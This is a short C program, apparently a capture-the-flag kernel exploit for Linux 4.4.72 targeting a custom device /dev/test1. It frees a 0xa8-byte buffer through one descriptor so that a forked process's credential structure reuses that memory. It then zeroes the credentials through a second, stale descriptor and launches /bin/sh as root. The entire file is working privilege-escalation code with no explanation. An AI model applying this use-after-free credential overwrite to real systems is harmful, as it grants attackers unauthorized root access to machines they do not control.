/*linux-4.4.72 smep/smap/nokaslr*/

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/fcntl.h>
#include<sys/wait.h>

int main(){
  char buffer[0xb0]="\0";
  int fd1 = open("/dev/test1",O_RDWR);
  int fd2 = open("/dev/test1",O_RDWR);
  write(fd1,buffer,0xa8);
  read(fd1,buffer,0xa8);
  close(fd1);
  int pid=fork();
  if(pid<0){
    puts("Fork Error");
    exit(0);
  }
  else if(pid>0)
    wait(NULL);
  else{
    ((int*)buffer)[0] = 2;
    write(fd2,buffer,0x28);
    system("/bin/sh");
  }
  return 0;
}
